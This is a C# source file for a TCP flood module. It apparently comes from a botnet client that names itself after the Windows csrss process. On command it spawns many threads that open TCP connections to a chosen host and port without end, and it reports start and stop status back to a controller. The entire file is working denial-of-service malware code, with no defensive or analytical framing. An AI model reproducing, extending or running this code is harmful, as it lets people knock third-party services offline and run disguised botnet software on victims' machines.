using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace MI_CSRSS.floods;

internal class TCP
{
	internal class TcpFloodingthreads
	{
		private IPEndPoint _ep;

		private Thread _thisThread;

		public TcpFloodingthreads(IPEndPoint ep)
		{
			_ep = ep;
			_thisThread = new Thread(_threadLoop);
			_thisThread.Start();
		}

		public void stopshit()
		{
			try
			{
				_thisThread.Suspend();
			}
			catch
			{
			}
		}

		private void _threadLoop()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Blocking = false;
						AsyncCallback callback = OnConnect;
						socket.BeginConnect(_ep, callback, socket);
						Thread.Sleep(_MSDelay);
					}
				}
				catch
				{
				}
			}
		}

		private static void OnConnect(IAsyncResult ar)
		{
		}
	}

	private static List<TcpFloodingthreads> _floods = new List<TcpFloodingthreads>();

	public static bool IsOnline = false;

	public static int _MSDelay;

	public static void tcpfloodstart(string host, int port, int threads, int delay)
	{
		_MSDelay = delay;
		Connection.BusyWithCmds = true;
		Connection.SendConnByte("STU~008~" + host + "~" + port + "~" + threads);
		if (!IsOnline)
		{
			IPEndPoint ep;
			try
			{
				ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
			}
			catch
			{
				ep = new IPEndPoint(IPAddress.Parse(host), port);
			}
			IsOnline = true;
			for (int i = 0; i < threads; i++)
			{
				_floods.Add(new TcpFloodingthreads(ep));
			}
		}
	}

	public static void tcpfloodstop()
	{
		IsOnline = false;
		Connection.BusyWithCmds = false;
		Connection.SendConnByte("STU~009");
		foreach (TcpFloodingthreads flood in _floods)
		{
			flood.stopshit();
		}
		Thread.Sleep(5000);
		Connection.SendConnByte("STU~000");
	}
}
